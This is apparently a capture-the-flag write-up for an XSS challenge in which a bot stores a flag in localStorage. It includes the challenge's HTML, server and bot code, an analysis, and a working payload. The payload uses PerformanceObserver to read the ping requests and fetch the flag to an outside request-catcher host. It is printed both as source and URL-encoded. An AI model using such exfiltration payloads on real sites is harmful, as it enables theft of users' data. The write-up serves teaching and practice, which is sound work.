# XSS Challenge Writeup

## Challenge Overview
This challenge presents a web application vulnerable to XSS with an interesting twist involving JavaScript closures and timing. The goal is to steal a flag that is temporarily stored in localStorage and then continuously sent to a ping endpoint.

## Challenge Files

### index.html
```html
<!DOCTYPE html>
<body>
  <h1>XSS Playground</h1>
  <script>
    (() => {
      const flag = localStorage.getItem("flag") ?? "🚩";
      localStorage.removeItem("flag");
      const fetch = Object.freeze(window.fetch);
      const resource = `/ping?${new URLSearchParams({ flag })}`;
      const options = Object.create(null);
      const fun = () => fetch(resource, options);
      setInterval(fun, 500);
    })();
    const params = new URLSearchParams(location.search);
    const xss = params.get("xss") ?? "console.log(1337)";
    setTimeout(xss, 800);
  </script>
</body>
```

### index.js
```javascript
import express from "express";
import fs from "node:fs";
const html = fs.readFileSync("index.html", { encoding: "utf8" });
express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      "base-uri 'none'; frame-ancestors 'none'"
    );
    next();
  })
  .get("/", (req, res) => res.type("html").send(html))
  .get("/ping", (req, res) => res.type("text").send("pong"))
  .listen(3000);
```

### bot.js
```javascript
import puppeteer from "puppeteer";
const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);
const APP_HOST = "web";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

// Flag format check
if (!/^ASIS{\w+}$/.test(FLAG)) {
  console.log("Bad flag");
  process.exit(1);
}

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
  });
  const context = await browser.createBrowserContext();
  try {
    const page1 = await context.newPage();
    await page1.goto(APP_URL + "/ping", { timeout: 3_000 });
    await page1.evaluate((flag) => {
      localStorage.setItem("flag", flag);
    }, FLAG);
    await sleep(1_000);
    await page1.close();
    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 5_000 });
    await sleep(10_000);
    await page2.close();
  } catch (e) {
    console.error(e);
  }
  await context.close();
  await browser.close();
};
```

## Challenge Analysis

### Key Mechanics
1. The application accepts an XSS payload through the `xss` URL parameter
2. A bot visits the application with these steps:
   - First visits /ping and sets the flag in localStorage
   - Then visits the user-provided URL with the XSS payload
3. The main application:
   - Retrieves flag from localStorage
   - Immediately removes it
   - Creates a frozen fetch function
   - Sets up an interval to send the flag to /ping every 500ms
   - Executes the XSS payload after 800ms

### Security Mechanisms
1. The fetch function is frozen using `Object.freeze()`
2. The flag is immediately removed from localStorage
3. Basic CSP headers are set (though they don't restrict script execution)

### Interesting Timing Sequence
```javascript
// In the IIFE:
const flag = localStorage.getItem("flag")     // 1. Get flag
localStorage.removeItem("flag")               // 2. Remove immediately
// ... setup ping interval ...

// Later:
setTimeout(xss, 800)                         // 3. XSS executes after 800ms
```

## The Vulnerability

The key vulnerability lies in JavaScript closures and the timing of events. Even though the flag is removed from localStorage, it remains accessible through the closure where it was captured in the `resource` variable. This captured value is then repeatedly sent to the /ping endpoint.

## The Exploit

The successful exploit uses the PerformanceObserver API to passively monitor these network requests:

```javascript
const observer = new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) {
        if (entry.name.includes('ping')) {
            fetch('https://noproblem.requestcatcher.com/?' + new URL(entry.name).searchParams.get('flag'));
        }
    }
});
observer.observe({ entryTypes: ['resource'] });
```

URL-encoded payload:
```
http://web:3000/?xss=const%20observer%20%3D%20new%20PerformanceObserver((list)%20%3D%3E%20%7B%20for%20(const%20entry%20of%20list.getEntries())%20%7B%20if%20(entry.name.includes(%27ping%27))%20%7B%20fetch(%27https%3A%2F%2Fnoproblem.requestcatcher.com%2F%3F%27%20%2B%20new%20URL(entry.name).searchParams.get(%27flag%27))%3B%20%7D%20%7D%20%7D)%3B%20observer.observe(%7B%20entryTypes%3A%20%5B%27resource%27%5D%20%7D)%3B
```

### Why This Works
1. PerformanceObserver can monitor network requests without needing to intercept them
2. The flag value persists in the closure even after localStorage clearance
3. The setInterval keeps sending requests containing the flag
4. Our observer captures these requests and extracts the flag

### Failed Approaches
1. Trying to read from localStorage (already cleared)
2. Attempting to override frozen fetch
3. XMLHttpRequest interception

## Key Takeaways
1. JavaScript closures can maintain access to values even after they're "deleted"
2. Passive observation can sometimes bypass active security measures
3. Timing in XSS payloads is crucial
4. Web APIs like PerformanceObserver provide powerful capabilities for monitoring

## Prevention
1. Don't store sensitive data in URLs or request parameters
2. Use secure session management instead of localStorage
3. Implement proper CSP headers to restrict script sources
4. Avoid mixing sensitive data with user-controlled JavaScript execution